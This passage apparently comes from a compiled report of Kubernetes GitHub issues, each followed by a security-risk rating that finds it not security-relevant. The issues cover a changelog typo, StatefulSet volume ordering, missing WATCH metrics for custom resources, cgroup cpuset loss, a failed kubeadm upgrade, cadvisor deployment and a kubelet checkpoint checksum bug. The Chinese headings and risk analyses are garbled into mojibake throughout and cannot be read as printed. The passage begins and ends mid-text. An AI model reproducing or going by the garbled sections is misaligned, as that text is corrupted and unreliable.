**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesçš„æ»šåŠ¨éƒ¨ç½²è¿‡ç¨‹ä¸­ï¼Œä¸€ä¸ªå¤„äºç»ˆæ­¢çŠ¶æ€çš„Podåœ¨è¿è¡Œpre-stopæœŸé—´ä»ç„¶æ¥æ”¶æµé‡ï¼Œå°½ç®¡EndpointSliceä¸­å·²å°†è¯¥Podçš„Readyæ¡ä»¶ç½®ä¸ºfalseï¼Œä½†å…¶IPä»ç„¶å­˜åœ¨äºEndpointSliceä¸­ã€‚è¿™å¯¼è‡´åœ¨å‘è¯¥æ­£åœ¨ç»ˆæ­¢çš„Podå‘é€æµé‡æ—¶å‡ºç°502é”™è¯¯ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªé—®é¢˜ä¸»è¦æ¶‰åŠæœåŠ¡çš„å¯ç”¨æ€§å’Œç¨³å®šæ€§ï¼Œå¯èƒ½å¼•èµ·çŸ­æš‚çš„æœåŠ¡ä¸­æ–­æˆ–é”™è¯¯å“åº”ã€‚ç„¶è€Œï¼Œè¯¥é—®é¢˜å¹¶ä¸æ¶‰åŠæ”»å‡»è€…å¯ä»¥åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œä¸ä¼šå¯¼è‡´æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œã€æ•°æ®æ³„éœ²ç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128460 fix changelog 1.31 documentation: kubeamd to kubeadm

- Issue é“¾æ¥ï¼š[#128460](https://github.com/kubernetes/kubernetes/issues/128460)

### Issue å†…å®¹

#### What happened?

Going through the release notes - I noticed a veryminor code documentation error "kubeamd join"
Some context - Very nice work here.  I have been using Kubernetes since 1.7 in 2018

https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.31.md#bug-or-regression


#### What did you expect to happen?

https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.31.md#bug-or-regression
-Kubeadm: when adding new control plane nodes with "kubeamd join", ensure that the etcd member addition is performed only if a given member URL does not already exist in the list of members
+Kubead,: when adding new control plane nodes with "kubeadm join", ensure that the etcd member addition is performed only if a given member URL does not already exist in the list of members

#### How can we reproduce it (as minimally and precisely as possible)?

Yes, a one line docs change - not code changes

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
michaelobrien@mbp7 modules % kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4-eks-a737599
```

</details>


#### Cloud provider

<details>
agnostic - but I am running EKS and K8S in Docker Desktop
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
@mbp7 modules % uname -a
Darwin mbp7.ht.home 24.0.0 Darwin Kernel Version 24.0.0: Tue Sep 24 23:39:07 PDT 2024; root:xnu-11215.1.12~1/RELEASE_ARM64_T6000 arm64

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæ˜¯å…³äºä¿®å¤æ–‡æ¡£ä¸­çš„ä¸€ä¸ªå°æ‹¼å†™é”™è¯¯ï¼Œå°†'kubeamd'æ›´æ­£ä¸º'kubeadm'ã€‚è¿™æ˜¯æ–‡æ¡£ä¸­çš„æ–‡å­—ä¿®æ”¹ï¼Œæ²¡æœ‰æ¶‰åŠä»£ç æ›´æ”¹ã€é…ç½®ä¿®æ”¹æˆ–ä»»ä½•åŠŸèƒ½æ€§çš„å˜åŒ–ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ­¤æ›´æ”¹ä»…å½±å“æ–‡æ¡£ï¼Œå¯¹ç³»ç»Ÿè¿è¡Œæ— å½±å“ï¼Œæ”»å‡»è€…æ— æ³•åˆ©ç”¨ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šæ­¤æƒ…å†µä¸é€‚ç”¨ã€‚
6. **å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ï¼šå› æ­¤ï¼Œæ­¤Issueé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---

## Issue #128459 Allocating PersistentVolume in-order for StatefulSet pods

- Issue é“¾æ¥ï¼š[#128459](https://github.com/kubernetes/kubernetes/issues/128459)

### Issue å†…å®¹

#### What happened?

StatefulSets are the right abstraction when deploying stateful clusters like etcd, kafka, zookeeper, yugabyte, etc.
On initial deployment, everything is great. PVs are allocated and the cluster works.
But in a recovery/recreation scenario, it is impossible to match the PVs with each numbered pod.
This means that pod0 will be started with a random PV, for example that which previously belonged to pod2.

#### What did you expect to happen?

StatefulSet volumeClaimTemplate should be configurable such that it will use persistent volumes with incrementing names.
In the same way that pods are named pod0,pod1, ..., they should not use labels for creating a PVC, but rather volume names with a similar index postfix, e.g. volumename0,volumename1, etc.

The lack of this functionality makes running stateful workloads a pain.

#### How can we reproduce it (as minimally and precisely as possible)?

.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ä½¿ç”¨StatefulSetéƒ¨ç½²æœ‰çŠ¶æ€åº”ç”¨æ—¶ï¼Œåœ¨æ¢å¤æˆ–é‡æ–°åˆ›å»ºåœºæ™¯ä¸‹ï¼Œæ— æ³•å°†æŒä¹…å·ï¼ˆPersistentVolumeï¼ŒPVï¼‰ä¸æ¯ä¸ªç¼–å·çš„PodåŒ¹é…çš„é—®é¢˜ã€‚è¿™å¯èƒ½å¯¼è‡´`pod0`å¯åŠ¨æ—¶ä½¿ç”¨äº†ä¹‹å‰å±äº`pod2`çš„PVã€‚è¿™ä¸ªé—®é¢˜ç»™è¿ç»´å’Œæ¢å¤è¿‡ç¨‹å¸¦æ¥äº†æŒ‘æˆ˜ï¼Œä½†å¹¶æœªæ¶‰åŠå®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

- **ç¬¬6æ¡**ï¼šå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

è¯¥é—®é¢˜ä¸»è¦æ˜¯å…³äºåŠŸèƒ½å’Œé…ç½®çš„æ”¹è¿›éœ€æ±‚ï¼Œæ²¡æœ‰æåŠå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œæˆ–å¯¼è‡´æ•°æ®æ³„éœ²ã€æƒé™æå‡ç­‰å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸º**ä¸æ¶‰åŠ**ã€‚

---

## Issue #128413 response_sizes metrics for verb=WATCH is only present for built in resources.

- Issue é“¾æ¥ï¼š[#128413](https://github.com/kubernetes/kubernetes/issues/128413)

### Issue å†…å®¹

#### What happened?

The `apiserver_response_sizes` correctly report `GET` and `LIST` metrics for all resources. However, for `WATCH`, its only present for built in resources. This means resources defined in CustomResourceDefinitions are not present.

Its not 100% clear to me what the expected behavior was when it was introduced (https://github.com/kubernetes/kubernetes/pull/49117), and if the plan was to not have `watch` metrics here - but we have seen it useful in practice. The verb definition here has changed a bit as well, and https://github.com/kubernetes/kubernetes/pull/93523 + https://github.com/kubernetes/kubernetes/pull/81660 split the definition of `verb` and `reportedVerb`. And given this metric is treated as STABLE now, it feels wrong to me to remove the existing `WATCH` metrics here.

Here is an example of how it works today;

```bash
$ kubectl get --raw /metrics | egrep 'apiserver_response_sizes_sum\{component="apiserver",group="(cilium.io)?",resource="(pods|ciliumnetworkpolicies)",scope="cluster"'
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="LIST",version="v1"} 1.00624648e+08
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="WATCH",version="v1"} 2.6141637319e+10
apiserver_response_sizes_sum{component="apiserver",group="cilium.io",resource="ciliumnetworkpolicies",scope="cluster",subresource="",verb="LIST",version="v2"} 1.723691e+06
```

As seen both resources have `LIST` metrics, but only the built in resource `pods` has `WATCH`.

#### What did you expect to happen?

I would expect the above request to also contain WATCH for the custom type as well;
```bash
$ kubectl get --raw /metrics | egrep 'apiserver_response_sizes_sum\{component="apiserver",group="(cilium.io)?",resource="(pods|ciliumnetworkpolicies)",scope="cluster"'
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="LIST",version="v1"} 1.00624648e+08
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="WATCH",version="v1"} 2.6141637319e+10
apiserver_response_sizes_sum{component="apiserver",group="cilium.io",resource="ciliumnetworkpolicies",scope="cluster",subresource="",verb="LIST",version="v2"} 1.723691e+06
apiserver_response_sizes_sum{component="apiserver",group="cilium.io",resource="ciliumnetworkpolicies",scope="cluster",subresource="",verb="WATCH",version="v2"} 1.090217513e+09
```

#### How can we reproduce it (as minimally and precisely as possible)?

Install a CRD, have at least one watcher on it, and use `kubectl get --raw /metrics | grep 'apiserver_response_sizes_sum'` and look for the `WATCH` metric of that resource.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0
```

Seems to be reproduceable across all recent versions.

</details>


#### Cloud provider

<details>
n/a - can reproduce in kind.
</details>


#### OS version

<details>

n/a.

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueæ¶‰åŠåˆ°Kubernetesåœ¨ç›‘æ§æŒ‡æ ‡`apiserver_response_sizes`ä¸­ï¼Œå¯¹äºè‡ªå®šä¹‰èµ„æºï¼ˆCustomResourceDefinitionï¼‰çš„`WATCH`æ“ä½œç¼ºå°‘ç›¸åº”çš„æŒ‡æ ‡æ•°æ®ã€‚è¿™ä¸ªé—®é¢˜å±äºåŠŸèƒ½æ€§ç¼ºé™·æˆ–ç›‘æ§æŒ‡æ ‡ä¸å®Œæ•´çš„é—®é¢˜ï¼Œä¸æ¶‰åŠæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ ¹æ®ç»™å®šçš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼ŒIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #128397 k8s cgroup cpuset disappear causing container restart

- Issue é“¾æ¥ï¼š[#128397](https://github.com/kubernetes/kubernetes/issues/128397)

### Issue å†…å®¹

#### What happened?



```

[root@n1 kubepods-besteffort.slice]# cat /sys/fs/cgroup/kubepods.slice/kubepods-besteffort.slice/*/cgroup.controllers
cpu io memory hugetlb pids rdma misc
cpu io memory hugetlb pids rdma misc

# wait 
[root@n1 kubepods-besteffort.slice]# cat /sys/fs/cgroup/kubepods.slice/kubepods-besteffort.slice/*/cgroup.controllers
cpuset cpu io memory hugetlb pids rdma misc
cpuset cpu io memory hugetlb pids rdma misc
```

the disappearance of cpuset causes container restart


How should I handle it

#### What did you expect to happen?

ã€‚

#### How can we reproduce it (as minimally and precisely as possible)?

Just install it

#### Anything else we need to know?

_No response_

#### Kubernetes version


- kubernetes-cni-1.2.0-150500.2.1.x86_64
- kubectl-1.28.15-150500.1.1.x86_64
- kubelet-1.28.15-150500.1.1.x86_64
- kubeadm-1.28.15-150500.1.1.x86_64
- containerd.io-1.7.22-3.1.el9.x86_64

<details>
```console
$ kubectl version
Client Version: v1.28.15
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="AlmaLinux"
VERSION="9.2 (Turquoise Kodkod)"
ID="almalinux"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.2"
PLATFORM_ID="platform:el9"
PRETTY_NAME="AlmaLinux 9.2 (Turquoise Kodkod)"
ANSI_COLOR="0;34"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:almalinux:almalinux:9::baseos"
HOME_URL="https://almalinux.org/"
DOCUMENTATION_URL="https://wiki.almalinux.org/"
BUG_REPORT_URL="https://bugs.almalinux.org/"

ALMALINUX_MANTISBT_PROJECT="AlmaLinux-9"
ALMALINUX_MANTISBT_PROJECT_VERSION="9.2"
REDHAT_SUPPORT_PRODUCT="AlmaLinux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.2"

$ uname -a
Linux bx-10-182-20-103 5.14.0-284.25.1.el9_2.sinarelease.6.x86_64 #1 SMP PREEMPT_DYNAMIC Mon Oct 30 03:56:46 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesç¯å¢ƒä¸­ï¼Œcgroupçš„cpusetæ§åˆ¶å™¨ä¼šæš‚æ—¶æ¶ˆå¤±ï¼Œç„¶ååˆé‡æ–°å‡ºç°ï¼Œå¯¼è‡´å®¹å™¨é‡å¯çš„é—®é¢˜ã€‚è¿™ä¼¼ä¹æ˜¯ç”±äºç³»ç»Ÿæœ¬èº«æˆ–Kubernetesè°ƒåº¦å¯¼è‡´çš„cgroupæ§åˆ¶å™¨çŠ¶æ€å˜åŒ–ï¼Œå¼•èµ·äº†å®¹å™¨çš„ä¸ç¨³å®šè¿è¡Œã€‚æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè¿™æ›´åƒæ˜¯ä¸€ä¸ªæ€§èƒ½æˆ–ç¨³å®šæ€§é—®é¢˜ï¼Œè€Œä¸æ˜¯å®‰å…¨é—®é¢˜ã€‚

æŒ‰ç…§é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ²¡æœ‰è¯æ®è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥é—®é¢˜ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·**ï¼šæ­¤é—®é¢˜æœªæ¶‰åŠä»»ä½•å·²çŸ¥çš„æ¼æ´æˆ–å¯è¢«åˆ©ç”¨çš„å®‰å…¨ç¼ºé™·ã€‚
3. **Issueæäº¤è€…çš„é—®é¢˜**ï¼šé—®é¢˜æè¿°çš„æ˜¯ç³»ç»Ÿè¡Œä¸ºï¼Œæ²¡æœ‰æåŠä»»ä½•ä¸å½“æ“ä½œæˆ–é…ç½®ã€‚
4. **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»**ï¼šè™½ç„¶å®¹å™¨é‡å¯å¯èƒ½å¯¼è‡´æœåŠ¡ä¸­æ–­ï¼Œä½†æ²¡æœ‰è¿¹è±¡è¡¨æ˜è¿™æ˜¯ç”±æ”»å‡»è€…è§¦å‘ï¼Œä¸”æœªè¯´æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤è¡Œä¸ºå®æ–½DoSæ”»å‡»ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128381 During the offline upgrade process from Kubernetes 1.22.16 to 1.25.1, the upgrade to version 1.24 proceeded normally, but when upgrading from 1.24 to 1.25, the connection to the API server was refused. Could this be due to significant differences between versions 1.24 and 1.25?

- Issue é“¾æ¥ï¼š[#128381](https://github.com/kubernetes/kubernetes/issues/128381)

### Issue å†…å®¹

#### What happened?

[root@master 1.25]#  kubeadm upgrade apply v1.25.1
[upgrade/config] Making sure the configuration is correct:
[upgrade/config] Reading configuration from the cluster...
[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'
[preflight] Running pre-flight checks.
[upgrade] Running cluster health checks
[upgrade/version] You have chosen to change the cluster version to "v1.25.1"
[upgrade/versions] Cluster version: v1.24.1
[upgrade/versions] kubeadm version: v1.25.1
[upgrade] Are you sure you want to proceed? [y/N]: y
[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster
[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection
[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'
[upgrade/apply] Upgrading your Static Pod-hosted control plane to version "v1.25.1" (timeout: 5m0s)...
[upgrade/etcd] Upgrading to TLS for etcd
[upgrade/staticpods] Preparing for "etcd" upgrade
[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade
[upgrade/etcd] Waiting for etcd to become available
[upgrade/staticpods] Writing new Static Pod manifests to "/etc/kubernetes/tmp/kubeadm-upgraded-manifests2899699821"
[upgrade/staticpods] Preparing for "kube-apiserver" upgrade
[upgrade/staticpods] Renewing apiserver certificate
[upgrade/staticpods] Renewing apiserver-kubelet-client certificate
[upgrade/staticpods] Renewing front-proxy-client certificate
[upgrade/staticpods] Renewing apiserver-etcd-client certificate
[upgrade/staticpods] Moved new manifest to "/etc/kubernetes/manifests/kube-apiserver.yaml" and backed up old manifest to "/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-10-28-04-13-27/kube-apiserver.yaml"
[upgrade/staticpods] Waiting for the kubelet to restart the component
[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)
[upgrade/apply] FATAL: couldn't upgrade control plane. kubeadm has tried to recover everything into the earlier state. Errors faced: failed to obtain static Pod hash for component kube-apiserver on Node 192.168.40.130: Get "https://apiserver.cluster.local:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-192.168.40.130?timeout=10s": dial tcp 192.168.40.130:6443: connect: connection refused
To see the stack trace of this error execute with --v=5 or higher
[root@master 1.25]#  kubeadm upgrade apply v1.25.1
[upgrade/config] Making sure the configuration is correct:
[upgrade/config] Reading configuration from the cluster...
[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'
[upgrade/config] FATAL: failed to get config map: Get "https://apiserver.cluster.local:6443/api/v1/namespaces/kube-system/configmaps/kubeadm-config?timeout=10s": dial tcp 192.168.40.130:6443: connect: connection refused


#### What did you expect to happen?

Normal upgrade

#### How can we reproduce it (as minimally and precisely as possible)?

Upgrading using an offline method

#### Anything else we need to know?

Upgrading from version 1.22.16 deployed using Sealer to version 1.25 in an offline environment.

#### Kubernetes version

1.24.1

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨ç¦»çº¿æ–¹å¼å°†Kubernetesä»1.24å‡çº§åˆ°1.25.1æ—¶ï¼Œé‡åˆ°äº†è¿æ¥åˆ°APIæœåŠ¡å™¨è¢«æ‹’ç»çš„é—®é¢˜ï¼Œå¯¼è‡´å‡çº§å¤±è´¥ã€‚ä»é”™è¯¯ä¿¡æ¯æ¥çœ‹ï¼Œè¿™æ˜¯ç”±äºkube-apiserveræ— æ³•æ­£å¸¸è¿æ¥æ‰€è‡´ï¼Œå¯èƒ½æ˜¯å‡çº§è¿‡ç¨‹ä¸­é…ç½®æˆ–å…¼å®¹æ€§çš„é—®é¢˜ã€‚è¯¥é—®é¢˜å±äºå‡çº§è¿‡ç¨‹ä¸­çš„æ“ä½œæ•…éšœï¼Œå¹¶ä¸æ¶‰åŠæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ²¡æœ‰æ¶‰åŠæ”»å‡»è€…å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚

---

## Issue #128378 The deployment method for cadvisor isn't effective

- Issue é“¾æ¥ï¼š[#128378](https://github.com/kubernetes/kubernetes/issues/128378)

### Issue å†…å®¹

#### What happened?

I deploy cadvisor following "https://github.com/google/cadvisor/tree/master/deploy/kubernetes". After "kustomize build "https://github.com/google/cadvisor/deploy/kubernetes/base?ref=${VERSION}" | kubectl apply -f -", there is no pod for cadvisor.

#### What did you expect to happen?

There is pod for cadvisor

#### How can we reproduce it (as minimally and precisely as possible)?

Follow "https://github.com/google/cadvisor/tree/master/deploy/kubernetes"

#### Anything else we need to know?

The output is 
```console
Warning: 'commonLabels' is deprecated. Please use 'labels' instead. Run 'kustomize edit fix' to update your Kustomization automatically.
namespace/cadvisor created
serviceaccount/cadvisor created
daemonset.apps/cadvisor created
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.28.14
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.15
```

</details>


#### Cloud provider

<details>
No
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œç”¨æˆ·åœ¨æŒ‰ç…§cadvisorçš„Kuberneteséƒ¨ç½²æ–¹æ³•è¿›è¡Œéƒ¨ç½²åï¼Œæ²¡æœ‰çœ‹åˆ°é¢„æœŸçš„cadvisor podã€‚è¿™æ˜¯ä¸€ä¸ªä¸éƒ¨ç½²è¿‡ç¨‹å’Œé…ç½®ç›¸å…³çš„åŠŸèƒ½æ€§é—®é¢˜ï¼Œæ²¡æœ‰æåŠä»»ä½•å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

- **ç¬¬6æ¡**ï¼šå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128375 [FG:InPlacePodVerticalScaling] failed to verify pod status checkpoint checksum because of different behaviors of func Quantity.Marshal and Quantity.Unmarshal

- Issue é“¾æ¥ï¼š[#128375](https://github.com/kubernetes/kubernetes/issues/128375)

### Issue å†…å®¹

#### What happened?

One line bug description: the content func [stateCheckpoint.storeState](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/state_checkpoint.go#L80) writes into the file /var/lib/kubelet/pod_status_manager_state is different from it func [stateCheckpoint.restoreState](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/state_checkpoint.go#L59) reads from the same file, which causes function [VerifyChecksum](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/checkpoint.go#L59) always fails for some format of Quantity value.


#### What did you expect to happen?

Kubelet doesn't crash and can start normally

#### How can we reproduce it (as minimally and precisely as possible)?

1. prepare a pod spec with content below
```yaml
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "nginx2"
  },
  "spec": {
    "containers": [
      {
        "name": "nginx",
        "image": "nginx:1.14.2",
        "ports": [
          {
            "containerPort": 80
          }
        ],
        "resources": {
          "requests": {
            "cpu": "0.4",
            "memory": "1Gi"
          },
          "limits": {
            "cpu": "1.5",
            "memory": "1Gi"
          }
        }
      }
    ]
  }
}
```
2. copy the pod spec into dir /etc/kubernetes/manifest/ in master node
3. restart the kubelet systemctl restart kubelet
4. the kubelet will crash all the time until the file /var/lib/kubelet/pod_status_manager_state is deleted
5. error message would be like below
```text
Aug 10 04:39:38 minikube systemd[1]: kubelet.service: Failed with result 'exit-code'.
Aug 10 04:39:38 minikube systemd[1]: kubelet.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
Aug 10 04:39:38 minikube kubelet[1190750]:         k8s.io/kubernetes/cmd/kubelet/app/server.go:1239 +0x90
Aug 10 04:39:38 minikube kubelet[1190750]: created by k8s.io/kubernetes/cmd/kubelet/app.startKubelet in goroutine 1
Aug 10 04:39:38 minikube kubelet[1190750]:         k8s.io/kubernetes/pkg/kubelet/kubelet.go:1628 +0x658
Aug 10 04:39:38 minikube kubelet[1190750]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).Run(0x4000ccac08, 0x4000ca1140)
Aug 10 04:39:38 minikube kubelet[1190750]:         k8s.io/kubernetes/pkg/kubelet/status/status_manager.go:204 +0x28c
Aug 10 04:39:38 minikube kubelet[1190750]: k8s.io/kubernetes/pkg/kubelet/status.(*manager).Start(0x40007a3a70)
Aug 10 04:39:38 minikube kubelet[1190750]: goroutine 239 [running]:
Aug 10 04:39:38 minikube kubelet[1190750]: panic: could not restore state from checkpoint: checkpoint is corrupted, please drain this node and delete pod allocation checkpoint file "/var/lib/kubelet/pod_status_manager_state" before restarting Kubelet
Aug 10 04:39:38 minikube kubelet[1190750]: E0810 04:39:38.722303 1190750 status_manager.go:203] "Could not initialize pod allocation checkpoint manager, please drain node and remove policy state file" err="could not restore state from checkpoint: checkpoint is corrupted, please drain this node and delete pod allocation checkpoint file \"/var/lib/kubelet/pod_status_manager_state\" before restarting Kubelet"
```


#### Anything else we need to know?

## Root cause
The json marshal function of Quantity type will convert itself to CanonicalBytes
https://github.com/kubernetes/apimachinery/blob/95b78024e3feada7739b40426690b4f287933fd8/pkg/api/resource/quantity.go#L452C25-L452C41
But the json unmarshal function of Quantity type won't do that.
https://github.com/kubernetes/apimachinery/blob/95b78024e3feada7739b40426690b4f287933fd8/pkg/api/resource/quantity.go#L701
For some formats for Quantity value, the Quantity contents, wrote to and read from the same file, might be different.
For example, if the pod cpu request is defined as cpu: "0.4", the Quantity content is cpu:{{4 -1} {<nil>}  DecimalSI before writing it into the file, but the content is cpu:{{400 -3} {<nil>} 400m DecimalSI after reading from the same file.

According to the reason above, the function [VerifyChecksum](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/checkpoint.go#L59) might fail.

## Detailed test case
<details>

```go
=== RUN   Test_stateCheckpoint_storeState
=== RUN   Test_stateCheckpoint_storeState/format_0_-_cpu_1Ki
=== RUN   Test_stateCheckpoint_storeState/format_1_-_cpu_1Mi
=== RUN   Test_stateCheckpoint_storeState/format_2_-_cpu_1Gi
=== RUN   Test_stateCheckpoint_storeState/format_3_-_cpu_1Ti
=== RUN   Test_stateCheckpoint_storeState/format_4_-_cpu_1Pi
